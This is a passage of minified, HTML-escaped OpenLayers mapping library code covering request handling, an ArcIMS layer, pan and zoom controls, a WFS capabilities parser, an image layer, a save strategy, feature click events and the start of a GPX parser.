b.prototype=a.prototype;g&amp;&amp;f.wrapped&amp;&amp;(b.wrapped=f.wrapped);b.UNSENT=0;b.OPENED=1;b.HEADERS_RECEIVED=2;b.LOADING=3;b.DONE=4;b.prototype.readyState=b.UNSENT;b.prototype.responseText="";b.prototype.responseXML=null;b.prototype.status=0;b.prototype.statusText="";b.prototype.priority="NORMAL";b.prototype.onreadystatechange=null;b.onreadystatechange=null;b.onopen=null;b.onsend=null;b.onabort=null;b.prototype.open=function(a,f,k,p,q){delete this._headers;3>arguments.length&amp;&amp;(k=!0);this._async=k;var r=this, s=this.readyState,t;h&amp;&amp;k&amp;&amp;(t=function(){s!=b.DONE&amp;&amp;(e(r),r.abort())},window.attachEvent("onunload",t));b.onopen&amp;&amp;b.onopen.apply(this,arguments);4&lt;arguments.length?this._object.open(a,f,k,p,q):3&lt;arguments.length?this._object.open(a,f,k,p):this._object.open(a,f,k);this.readyState=b.OPENED;c(this);this._object.onreadystatechange=function(){if(!g||k)r.readyState=r._object.readyState,d(r),r._aborted?r.readyState=b.UNSENT:(r.readyState==b.DONE&amp;&amp;(delete r._data,e(r),h&amp;&amp;k&amp;&amp;window.detachEvent("onunload",t)), s!=r.readyState&amp;&amp;c(r),s=r.readyState)}};b.prototype.send=function(a){b.onsend&amp;&amp;b.onsend.apply(this,arguments);arguments.length||(a=null);a&amp;&amp;a.nodeType&amp;&amp;(a=window.XMLSerializer?(new window.XMLSerializer).serializeToString(a):a.xml,this._headers["Content-Type"]||this._object.setRequestHeader("Content-Type","application/xml"));this._data=a;a:if(this._object.send(this._data),g&amp;&amp;!this._async)for(this.readyState=b.OPENED,d(this);this.readyState&lt;b.DONE;)if(this.readyState++,c(this),this._aborted)break a}; b.prototype.abort=function(){b.onabort&amp;&amp;b.onabort.apply(this,arguments);this.readyState>b.UNSENT&amp;&amp;(this._aborted=!0);this._object.abort();e(this);this.readyState=b.UNSENT;delete this._data};b.prototype.getAllResponseHeaders=function(){return this._object.getAllResponseHeaders()};b.prototype.getResponseHeader=function(a){return this._object.getResponseHeader(a)};b.prototype.setRequestHeader=function(a,b){this._headers||(this._headers={});this._headers[a]=b;return this._object.setRequestHeader(a,b)}; b.prototype.addEventListener=function(a,b,c){for(var d=0,e;e=this._listeners[d];d++)if(e[0]==a&amp;&amp;e[1]==b&amp;&amp;e[2]==c)return;this._listeners.push([a,b,c])};b.prototype.removeEventListener=function(a,b,c){for(var d=0,e;(e=this._listeners[d])&amp;&amp;(e[0]!=a||e[1]!=b||e[2]!=c);d++);e&amp;&amp;this._listeners.splice(d,1)};b.prototype.dispatchEvent=function(a){a={type:a.type,target:this,currentTarget:this,eventPhase:2,bubbles:a.bubbles,cancelable:a.cancelable,timeStamp:a.timeStamp,stopPropagation:function(){},preventDefault:function(){}, initEvent:function(){}};"readystatechange"==a.type&amp;&amp;this.onreadystatechange&amp;&amp;(this.onreadystatechange.handleEvent||this.onreadystatechange).apply(this,[a]);for(var b=0,c;c=this._listeners[b];b++)c[0]!=a.type||c[2]||(c[1].handleEvent||c[1]).apply(this,[a])};b.prototype.toString=function(){return"[object XMLHttpRequest]"};b.toString=function(){return"[XMLHttpRequest]"};window.Function.prototype.apply||(window.Function.prototype.apply=function(a,b){b||(b=[]);a.__func=this;a.__func(b[0],b[1],b[2],b[3], b[4]);delete a.__func});OpenLayers.Request||(OpenLayers.Request={});OpenLayers.Request.XMLHttpRequest=b})();OpenLayers.ProxyHost="";OpenLayers.Request||(OpenLayers.Request={}); OpenLayers.Util.extend(OpenLayers.Request,{DEFAULT_CONFIG:{method:"GET",url:window.location.href,async:!0,user:void 0,password:void 0,params:null,proxy:OpenLayers.ProxyHost,headers:{},data:null,callback:function(){},success:null,failure:null,scope:null},URL_SPLIT_REGEX:/([^:]*:)\/\/([^:]*:?[^@]*@)?([^:\/\?]*):?([^\/\?]*)/,events:new OpenLayers.Events(this),makeSameOrigin:function(a,b){var c=0!==a.indexOf("http"),d=!c&amp;&amp;a.match(this.URL_SPLIT_REGEX);if(d){var e=window.location,c=d[1]==e.protocol&amp;&amp;d[3]== e.hostname,d=d[4],e=e.port;if(80!=d&amp;&amp;""!=d||"80"!=e&amp;&amp;""!=e)c=c&amp;&amp;d==e}c||b&amp;&amp;(a="function"==typeof b?b(a):b+encodeURIComponent(a));return a},issue:function(a){var b=OpenLayers.Util.extend(this.DEFAULT_CONFIG,{proxy:OpenLayers.ProxyHost});a=a||{};a.headers=a.headers||{};a=OpenLayers.Util.applyDefaults(a,b);a.headers=OpenLayers.Util.applyDefaults(a.headers,b.headers);var b=!1,c;for(c in a.headers)a.headers.hasOwnProperty(c)&amp;&amp;"x-requested-with"===c.toLowerCase()&amp;&amp;(b=!0);!1===b&amp;&amp;(a.headers["X-Requested-With"]= "XMLHttpRequest");var d=new OpenLayers.Request.XMLHttpRequest,e=OpenLayers.Util.urlAppend(a.url,OpenLayers.Util.getParameterString(a.params||{})),e=OpenLayers.Request.makeSameOrigin(e,a.proxy);d.open(a.method,e,a.async,a.user,a.password);for(var f in a.headers)d.setRequestHeader(f,a.headers[f]);var g=this.events,h=this;d.onreadystatechange=function(){d.readyState==OpenLayers.Request.XMLHttpRequest.DONE&amp;&amp;!1!==g.triggerEvent("complete",{request:d,config:a,requestUrl:e})&amp;&amp;h.runCallbacks({request:d,config:a, requestUrl:e})};!1===a.async?d.send(a.data):window.setTimeout(function(){0!==d.readyState&amp;&amp;d.send(a.data)},0);return d},runCallbacks:function(a){var b=a.request,c=a.config,d=c.scope?OpenLayers.Function.bind(c.callback,c.scope):c.callback,e;c.success&amp;&amp;(e=c.scope?OpenLayers.Function.bind(c.success,c.scope):c.success);var f;c.failure&amp;&amp;(f=c.scope?OpenLayers.Function.bind(c.failure,c.scope):c.failure);"file:"==OpenLayers.Util.createUrlObject(c.url).protocol&amp;&amp;b.responseText&amp;&amp;(b.status=200);d(b);if(!b.status|| 200&lt;=b.status&amp;&amp;300>b.status)this.events.triggerEvent("success",a),e&amp;&amp;e(b);b.status&amp;&amp;(200>b.status||300&lt;=b.status)&amp;&amp;(this.events.triggerEvent("failure",a),f&amp;&amp;f(b))},GET:function(a){a=OpenLayers.Util.extend(a,{method:"GET"});return OpenLayers.Request.issue(a)},POST:function(a){a=OpenLayers.Util.extend(a,{method:"POST"});a.headers=a.headers?a.headers:{};"CONTENT-TYPE"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers["Content-Type"]="application/xml");return OpenLayers.Request.issue(a)},PUT:function(a){a= OpenLayers.Util.extend(a,{method:"PUT"});a.headers=a.headers?a.headers:{};"CONTENT-TYPE"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers["Content-Type"]="application/xml");return OpenLayers.Request.issue(a)},DELETE:function(a){a=OpenLayers.Util.extend(a,{method:"DELETE"});return OpenLayers.Request.issue(a)},HEAD:function(a){a=OpenLayers.Util.extend(a,{method:"HEAD"});return OpenLayers.Request.issue(a)},OPTIONS:function(a){a=OpenLayers.Util.extend(a,{method:"OPTIONS"});return OpenLayers.Request.issue(a)}});OpenLayers.Layer.ArcIMS=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{ClientVersion:"9.2",ServiceName:""},featureCoordSys:"4326",filterCoordSys:"4326",layers:null,async:!0,name:"ArcIMS",isBaseLayer:!0,DEFAULT_OPTIONS:{tileSize:new OpenLayers.Size(512,512),featureCoordSys:"4326",filterCoordSys:"4326",layers:null,isBaseLayer:!0,async:!0,name:"ArcIMS"},initialize:function(a,b,c){this.tileSize=new OpenLayers.Size(512,512);this.params=OpenLayers.Util.applyDefaults({ServiceName:c.serviceName}, this.DEFAULT_PARAMS);this.options=OpenLayers.Util.applyDefaults(c,this.DEFAULT_OPTIONS);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,this.params,c]);this.transparent&amp;&amp;(this.isBaseLayer||(this.isBaseLayer=!1),"image/jpeg"==this.format&amp;&amp;(this.format=OpenLayers.Util.alphaHack()?"image/gif":"image/png"));null===this.options.layers&amp;&amp;(this.options.layers=[])},getURL:function(a){var b="";a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,{requesttype:"image", envelope:a.toArray(),tileSize:this.tileSize}));a=new OpenLayers.Request.POST({url:this.getFullRequestString(),data:a.write(),async:!1});null!=a&amp;&amp;(b=a.responseXML,b&amp;&amp;b.documentElement||(b=a.responseText),b=(new OpenLayers.Format.ArcXML).read(b),b=this.getUrlOrImage(b.image.output));return b},getURLasync:function(a,b,c){a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,{requesttype:"image",envelope:a.toArray(),tileSize:this.tileSize}));OpenLayers.Request.POST({url:this.getFullRequestString(), async:!0,data:a.write(),callback:function(a){var e=a.responseXML;e&amp;&amp;e.documentElement||(e=a.responseText);a=(new OpenLayers.Format.ArcXML).read(e);b.call(c,this.getUrlOrImage(a.image.output))},scope:this})},getUrlOrImage:function(a){var b="";a.url?b=a.url:a.data&amp;&amp;(b="data:image/"+a.type+";base64,"+a.data);return b},setLayerQuery:function(a,b){for(var c=0;c&lt;this.options.layers.length;c++)if(a==this.options.layers[c].id){this.options.layers[c].query=b;return}this.options.layers.push({id:a,visible:!0, query:b})},getFeatureInfo:function(a,b,c){var d=c.buffer||1,e=c.callback||function(){},f=c.scope||window,g={};OpenLayers.Util.extend(g,this.options);g.requesttype="feature";a instanceof OpenLayers.LonLat?(g.polygon=null,g.envelope=[a.lon-d,a.lat-d,a.lon+d,a.lat+d]):a instanceof OpenLayers.Geometry.Polygon&amp;&amp;(g.envelope=null,g.polygon=a);var h=new OpenLayers.Format.ArcXML(g);OpenLayers.Util.extend(h.request.get_feature,c);h.request.get_feature.layer=b.id;"number"==typeof b.query.accuracy?h.request.get_feature.query.accuracy= b.query.accuracy:(a=this.map.getCenter(),c=this.map.getViewPortPxFromLonLat(a),c.x++,c=this.map.getLonLatFromPixel(c),h.request.get_feature.query.accuracy=c.lon-a.lon);h.request.get_feature.query.where=b.query.where;h.request.get_feature.query.spatialfilter.relation="area_intersection";OpenLayers.Request.POST({url:this.getFullRequestString({CustomService:"Query"}),data:h.write(),callback:function(a){a=h.parseResponse(a.responseText);h.iserror()?e.call(f,null):e.call(f,a.features)}})},clone:function(a){null== a&amp;&amp;(a=new OpenLayers.Layer.ArcIMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},CLASS_NAME:"OpenLayers.Layer.ArcIMS"});OpenLayers.Control.PanZoom=OpenLayers.Class(OpenLayers.Control,{slideFactor:50,slideRatio:null,buttons:null,position:null,initialize:function(a){this.position=new OpenLayers.Pixel(OpenLayers.Control.PanZoom.X,OpenLayers.Control.PanZoom.Y);OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onButtonClick);this.removeButtons();this.position=this.buttons=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)}, setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.register("buttonclick",this,this.onButtonClick)},draw:function(a){OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position;this.buttons=[];var b={w:18,h:18},c=new OpenLayers.Pixel(a.x+b.w/2,a.y);this._addButton("panup","north-mini.png",c,b);a.y=c.y+b.h;this._addButton("panleft","west-mini.png",a,b);this._addButton("panright","east-mini.png",a.add(b.w,0),b);this._addButton("pandown","south-mini.png", c.add(0,2*b.h),b);this._addButton("zoomin","zoom-plus-mini.png",c.add(0,3*b.h+5),b);this._addButton("zoomworld","zoom-world-mini.png",c.add(0,4*b.h+5),b);this._addButton("zoomout","zoom-minus-mini.png",c.add(0,5*b.h+5),b);return this.div},_addButton:function(a,b,c,d){b=OpenLayers.Util.getImageLocation(b);c=OpenLayers.Util.createAlphaImageDiv(this.id+"_"+a,c,d,b,"absolute");c.style.cursor="pointer";this.div.appendChild(c);c.action=a;c.className="olButton";this.buttons.push(c);return c},_removeButton:function(a){this.div.removeChild(a); OpenLayers.Util.removeItem(this.buttons,a)},removeButtons:function(){for(var a=this.buttons.length-1;0&lt;=a;--a)this._removeButton(this.buttons[a])},onButtonClick:function(a){switch(a.buttonElement.action){case "panup":this.map.pan(0,-this.getSlideFactor("h"));break;case "pandown":this.map.pan(0,this.getSlideFactor("h"));break;case "panleft":this.map.pan(-this.getSlideFactor("w"),0);break;case "panright":this.map.pan(this.getSlideFactor("w"),0);break;case "zoomin":this.map.zoomIn();break;case "zoomout":this.map.zoomOut(); break;case "zoomworld":this.map.zoomToMaxExtent()}},getSlideFactor:function(a){return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor},CLASS_NAME:"OpenLayers.Control.PanZoom"});OpenLayers.Control.PanZoom.X=4;OpenLayers.Control.PanZoom.Y=4;OpenLayers.Control.PanZoomBar=OpenLayers.Class(OpenLayers.Control.PanZoom,{zoomStopWidth:18,zoomStopHeight:11,slider:null,sliderEvents:null,zoombarDiv:null,zoomWorldIcon:!1,panIcons:!0,forceFixedZoomLevel:!1,mouseDragStart:null,deltaY:null,zoomStart:null,destroy:function(){this._removeZoomBar();this.map.events.un({changebaselayer:this.redraw,updatesize:this.redraw,scope:this});OpenLayers.Control.PanZoom.prototype.destroy.apply(this,arguments);delete this.mouseDragStart;delete this.zoomStart},setMap:function(a){OpenLayers.Control.PanZoom.prototype.setMap.apply(this, arguments);this.map.events.on({changebaselayer:this.redraw,updatesize:this.redraw,scope:this})},redraw:function(){null!=this.div&amp;&amp;(this.removeButtons(),this._removeZoomBar());this.draw()},draw:function(a){OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position.clone();this.buttons=[];var b={w:18,h:18};if(this.panIcons){var c=new OpenLayers.Pixel(a.x+b.w/2,a.y),d=b.w;this.zoomWorldIcon&amp;&amp;(c=new OpenLayers.Pixel(a.x+b.w,a.y));this._addButton("panup","north-mini.png",c,b);a.y=c.y+b.h; this._addButton("panleft","west-mini.png",a,b);this.zoomWorldIcon&amp;&amp;(this._addButton("zoomworld","zoom-world-mini.png",a.add(b.w,0),b),d*=2);this._addButton("panright","east-mini.png",a.add(d,0),b);this._addButton("pandown","south-mini.png",c.add(0,2*b.h),b);this._addButton("zoomin","zoom-plus-mini.png",c.add(0,3*b.h+5),b);c=this._addZoomBar(c.add(0,4*b.h+5));this._addButton("zoomout","zoom-minus-mini.png",c,b)}else this._addButton("zoomin","zoom-plus-mini.png",a,b),c=this._addZoomBar(a.add(0,b.h)), this._addButton("zoomout","zoom-minus-mini.png",c,b),this.zoomWorldIcon&amp;&amp;(c=c.add(0,b.h+3),this._addButton("zoomworld","zoom-world-mini.png",c,b));return this.div},_addZoomBar:function(a){var b=OpenLayers.Util.getImageLocation("slider.png"),c=this.id+"_"+this.map.id,d=this.map.getMinZoom(),e=this.map.getNumZoomLevels()-1-this.map.getZoom(),e=OpenLayers.Util.createAlphaImageDiv(c,a.add(-1,e*this.zoomStopHeight),{w:20,h:9},b,"absolute");e.style.cursor="move";this.slider=e;this.sliderEvents=new OpenLayers.Events(this, e,null,!0,{includeXY:!0});this.sliderEvents.on({touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp,mousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp});var f={w:this.zoomStopWidth,h:this.zoomStopHeight*(this.map.getNumZoomLevels()-d)},b=OpenLayers.Util.getImageLocation("zoombar.png"),c=null;OpenLayers.Util.alphaHack()?(c=this.id+"_"+this.map.id,c=OpenLayers.Util.createAlphaImageDiv(c,a,{w:f.w,h:this.zoomStopHeight},b,"absolute",null,"crop"),c.style.height= f.h+"px"):c=OpenLayers.Util.createDiv("OpenLayers_Control_PanZoomBar_Zoombar"+this.map.id,a,f,b);c.style.cursor="pointer";c.className="olButton";this.zoombarDiv=c;this.div.appendChild(c);this.startTop=parseInt(c.style.top);this.div.appendChild(e);this.map.events.register("zoomend",this,this.moveZoomBar);return a=a.add(0,this.zoomStopHeight*(this.map.getNumZoomLevels()-d))},_removeZoomBar:function(){this.sliderEvents.un({touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp, mousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp});this.sliderEvents.destroy();this.div.removeChild(this.zoombarDiv);this.zoombarDiv=null;this.div.removeChild(this.slider);this.slider=null;this.map.events.unregister("zoomend",this,this.moveZoomBar)},onButtonClick:function(a){OpenLayers.Control.PanZoom.prototype.onButtonClick.apply(this,arguments);if(a.buttonElement===this.zoombarDiv){var b=a.buttonXY.y/this.zoomStopHeight;if(this.forceFixedZoomLevel||!this.map.fractionalZoom)b= Math.floor(b);b=this.map.getNumZoomLevels()-1-b;b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1);this.map.zoomTo(b)}},passEventToSlider:function(a){this.sliderEvents.handleBrowserEvent(a)},zoomBarDown:function(a){if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.map.events.on({touchmove:this.passEventToSlider,mousemove:this.passEventToSlider,mouseup:this.passEventToSlider,scope:this}),this.mouseDragStart=a.xy.clone(),this.zoomStart=a.xy.clone(),this.div.style.cursor= "move",this.zoombarDiv.offsets=null,OpenLayers.Event.stop(a)},zoomBarDrag:function(a){if(null!=this.mouseDragStart){var b=this.mouseDragStart.y-a.xy.y,c=OpenLayers.Util.pagePosition(this.zoombarDiv);0&lt;a.clientY-c[1]&amp;&amp;a.clientY-c[1]&lt;parseInt(this.zoombarDiv.style.height)-2&amp;&amp;(b=parseInt(this.slider.style.top)-b,this.slider.style.top=b+"px",this.mouseDragStart=a.xy.clone());this.deltaY=this.zoomStart.y-a.xy.y;OpenLayers.Event.stop(a)}},zoomBarUp:function(a){if((OpenLayers.Event.isLeftClick(a)||"touchend"=== a.type)&amp;&amp;this.mouseDragStart){this.div.style.cursor="";this.map.events.un({touchmove:this.passEventToSlider,mouseup:this.passEventToSlider,mousemove:this.passEventToSlider,scope:this});var b=this.map.zoom;!this.forceFixedZoomLevel&amp;&amp;this.map.fractionalZoom?(b+=this.deltaY/this.zoomStopHeight,b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1)):(b+=this.deltaY/this.zoomStopHeight,b=Math.max(Math.round(b),0));this.map.zoomTo(b);this.zoomStart=this.mouseDragStart=null;this.deltaY=0;OpenLayers.Event.stop(a)}}, moveZoomBar:function(){var a=(this.map.getNumZoomLevels()-1-this.map.getZoom())*this.zoomStopHeight+this.startTop+1;this.slider.style.top=a+"px"},CLASS_NAME:"OpenLayers.Control.PanZoomBar"});OpenLayers.Format.WFSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.0",CLASS_NAME:"OpenLayers.Format.WFSCapabilities"});OpenLayers.Format.WFSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{wfs:"http://www.opengis.net/wfs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows"},errorProperty:"featureTypeList",defaultPrefix:"wfs",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{wfs:{WFS_Capabilities:function(a, b){this.readChildNodes(a,b)},FeatureTypeList:function(a,b){b.featureTypeList={featureTypes:[]};this.readChildNodes(a,b.featureTypeList)},FeatureType:function(a,b){var c={};this.readChildNodes(a,c);b.featureTypes.push(c)},Name:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(c=c.split(":"),b.name=c.pop(),0&lt;c.length&amp;&amp;(b.featureNS=this.lookupNamespaceURI(a,c[0])))},Title:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.title=c)},Abstract:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b["abstract"]=c)}}}, CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1"});OpenLayers.Format.WFSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,{regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},readers:{wfs:OpenLayers.Util.applyDefaults({DefaultSRS:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.srs=c)}},OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs),ows:OpenLayers.Format.OWSCommon.v1.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1_1_0"});OpenLayers.Layer.Image=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!0,url:null,extent:null,size:null,tile:null,aspectRatio:null,initialize:function(a,b,c,d,e){this.url=b;this.maxExtent=this.extent=c;this.size=d;OpenLayers.Layer.prototype.initialize.apply(this,[a,e]);this.aspectRatio=this.extent.getHeight()/this.size.h/(this.extent.getWidth()/this.size.w)},destroy:function(){this.tile&amp;&amp;(this.removeTileMonitoringHooks(this.tile),this.tile.destroy(),this.tile=null);OpenLayers.Layer.prototype.destroy.apply(this, arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Image(this.name,this.url,this.extent,this.size,this.getOptions()));return a=OpenLayers.Layer.prototype.clone.apply(this,[a])},setMap:function(a){null==this.options.maxResolution&amp;&amp;(this.options.maxResolution=this.aspectRatio*this.extent.getWidth()/this.size.w);OpenLayers.Layer.prototype.setMap.apply(this,arguments)},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=null==this.tile;if(b||d){this.setTileSize(); var e=this.map.getLayerPxFromLonLat({lon:this.extent.left,lat:this.extent.top});d?(this.tile=new OpenLayers.Tile.Image(this,e,this.extent,null,this.tileSize),this.addTileMonitoringHooks(this.tile)):(this.tile.size=this.tileSize.clone(),this.tile.position=e.clone());this.tile.draw()}},setTileSize:function(){var a=this.extent.getWidth()/this.map.getResolution(),b=this.extent.getHeight()/this.map.getResolution();this.tileSize=new OpenLayers.Size(a,b)},addTileMonitoringHooks:function(a){a.onLoadStart= function(){this.events.triggerEvent("loadstart")};a.events.register("loadstart",this,a.onLoadStart);a.onLoadEnd=function(){this.events.triggerEvent("loadend")};a.events.register("loadend",this,a.onLoadEnd);a.events.register("unload",this,a.onLoadEnd)},removeTileMonitoringHooks:function(a){a.unload();a.events.un({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,scope:this})},setUrl:function(a){this.url=a;this.tile.draw()},getURL:function(a){return this.url},CLASS_NAME:"OpenLayers.Layer.Image"});OpenLayers.Strategy=OpenLayers.Class({layer:null,options:null,active:null,autoActivate:!0,autoDestroy:!0,initialize:function(a){OpenLayers.Util.extend(this,a);this.options=a;this.active=!1},destroy:function(){this.deactivate();this.options=this.layer=null},setLayer:function(a){this.layer=a},activate:function(){return this.active?!1:this.active=!0},deactivate:function(){return this.active?(this.active=!1,!0):!1},CLASS_NAME:"OpenLayers.Strategy"});OpenLayers.Strategy.Save=OpenLayers.Class(OpenLayers.Strategy,{events:null,auto:!1,timer:null,initialize:function(a){OpenLayers.Strategy.prototype.initialize.apply(this,[a]);this.events=new OpenLayers.Events(this)},activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a&amp;&amp;this.auto)if("number"===typeof this.auto)this.timer=window.setInterval(OpenLayers.Function.bind(this.save,this),1E3*this.auto);else this.layer.events.on({featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave, scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.auto&amp;&amp;("number"===typeof this.auto?window.clearInterval(this.timer):this.layer.events.un({featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave,scope:this}));return a},triggerSave:function(a){var b=a.feature;b.state!==OpenLayers.State.INSERT&amp;&amp;b.state!==OpenLayers.State.UPDATE&amp;&amp;b.state!==OpenLayers.State.DELETE||this.save([a.feature])},save:function(a){a||(a=this.layer.features); this.events.triggerEvent("start",{features:a});var b=this.layer.projection,c=this.layer.map.getProjectionObject();if(!c.equals(b)){for(var d=a.length,e=Array(d),f,g,h=0;h&lt;d;++h)f=a[h],g=f.clone(),g.fid=f.fid,g.state=f.state,f.url&amp;&amp;(g.url=f.url),g._original=f,g.geometry.transform(c,b),e[h]=g;a=e}this.layer.protocol.commit(a,{callback:this.onCommit,scope:this})},onCommit:function(a){var b={response:a};if(a.success()){for(var c=a.reqFeatures,d,e=[],f=a.insertIds||[],g=0,h=0,k=c.length;h&lt;k;++h)if(d=c[h], d=d._original||d,a=d.state)a==OpenLayers.State.DELETE?e.push(d):a==OpenLayers.State.INSERT&amp;&amp;(d.fid=f[g],++g),d.state=null;0&lt;e.length&amp;&amp;this.layer.destroyFeatures(e);this.events.triggerEvent("success",b)}else this.events.triggerEvent("fail",b)},CLASS_NAME:"OpenLayers.Strategy.Save"});OpenLayers.Events.featureclick=OpenLayers.Class({cache:null,map:null,provides:["featureclick","nofeatureclick","featureover","featureout"],initialize:function(a){this.target=a;if(a.object instanceof OpenLayers.Map)this.setMap(a.object);else if(a.object instanceof OpenLayers.Layer.Vector)a.object.map?this.setMap(a.object.map):a.object.events.register("added",this,function(b){this.setMap(a.object.map)});else throw"Listeners for '"+this.provides.join("', '")+"' events can only be registered for OpenLayers.Layer.Vector or OpenLayers.Map instances"; for(var b=this.provides.length-1;0&lt;=b;--b)a.extensions[this.provides[b]]=!0},setMap:function(a){this.map=a;this.cache={};a.events.register("mousedown",this,this.start,{extension:!0});a.events.register("mouseup",this,this.onClick,{extension:!0});a.events.register("touchstart",this,this.start,{extension:!0});a.events.register("touchmove",this,this.cancel,{extension:!0});a.events.register("touchend",this,this.onClick,{extension:!0});a.events.register("mousemove",this,this.onMousemove,{extension:!0})}, start:function(a){this.startEvt=a},cancel:function(a){delete this.startEvt},onClick:function(a){if(this.startEvt&amp;&amp;("touchend"===a.type||OpenLayers.Event.isLeftClick(a))){a=this.getFeatures(this.startEvt);delete this.startEvt;for(var b,c,d={},e=0,f=a.length;e&lt;f&amp;&amp;(b=a[e],c=b.layer,d[c.id]=!0,b=this.triggerEvent("featureclick",{feature:b}),!1!==b);++e);e=0;for(f=this.map.layers.length;e&lt;f;++e)c=this.map.layers[e],c instanceof OpenLayers.Layer.Vector&amp;&amp;!d[c.id]&amp;&amp;this.triggerEvent("nofeatureclick",{layer:c})}}, onMousemove:function(a){delete this.startEvt;var b=this.getFeatures(a),c={};a=[];for(var d,e=0,f=b.length;e&lt;f;++e)d=b[e],c[d.id]=d,this.cache[d.id]||a.push(d);var b=[],g;for(g in this.cache)d=this.cache[g],d.layer&amp;&amp;d.layer.map?c[d.id]||b.push(d):delete this.cache[g];e=0;for(f=a.length;e&lt;f&amp;&amp;(d=a[e],this.cache[d.id]=d,g=this.triggerEvent("featureover",{feature:d}),!1!==g);++e);e=0;for(f=b.length;e&lt;f&amp;&amp;(d=b[e],delete this.cache[d.id],g=this.triggerEvent("featureout",{feature:d}),!1!==g);++e);},triggerEvent:function(a, b){var c=b.feature?b.feature.layer:b.layer,d=this.target.object;if(d instanceof OpenLayers.Map||d===c)return this.target.triggerEvent(a,b)},getFeatures:function(a){var b=a.clientX,c=a.clientY,d=[],e=[],f=[],g,h,k,l;for(l=this.map.layers.length-1;0&lt;=l;--l)if(g=this.map.layers[l],"none"!==g.div.style.display)if(g.renderer instanceof OpenLayers.Renderer.Elements){if(g instanceof OpenLayers.Layer.Vector)for(h=document.elementFromPoint(b,c);h&amp;&amp;h._featureId;)(k=g.getFeatureById(h._featureId))?(d.push(k), h.style.display="none",e.push(h),h=document.elementFromPoint(b,c)):h=!1;f.push(g);g.div.style.display="none"}else g.renderer instanceof OpenLayers.Renderer.Canvas&amp;&amp;(k=g.renderer.getFeatureIdFromEvent(a))&amp;&amp;(d.push(k),f.push(g));l=0;for(a=e.length;l&lt;a;++l)e[l].style.display="";for(l=f.length-1;0&lt;=l;--l)f[l].div.style.display="block";return d},destroy:function(){for(var a=this.provides.length-1;0&lt;=a;--a)delete this.target.extensions[this.provides[a]];this.map.events.un({mousemove:this.onMousemove,mousedown:this.start, mouseup:this.onClick,touchstart:this.start,touchmove:this.cancel,touchend:this.onClick,scope:this});delete this.cache;delete this.map;delete this.target}});OpenLayers.Events.nofeatureclick=OpenLayers.Events.featureclick;OpenLayers.Events.featureover=OpenLayers.Events.featureclick;OpenLayers.Events.featureout=OpenLayers.Events.featureclick;OpenLayers.Format.GPX=OpenLayers.Class(OpenLayers.Format.XML,{defaultDesc:"No description available",extractWaypoints:!0,extractTracks:!0,extractRoutes:!0,extractAttributes:!0,namespaces:{gpx:"http://www.topografix.com/GPX/1/1",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd",creator:"OpenLayers",initialize:function(a){this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this, [a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=[];if(this.extractTracks)for(var c=a.getElementsByTagName("trk"),d=0,e=c.length;d&lt;e;d++){var f={};this.extractAttributes&amp;&amp;(f=this.parseAttributes(c[d]));for(var g=this.getElementsByTagNameNS(c[d],c[d].namespaceURI,"trkseg"),h=0,k=g.length;h&lt;k;h++){var l=this.extractSegment(g[h],"trkpt");b.push(new 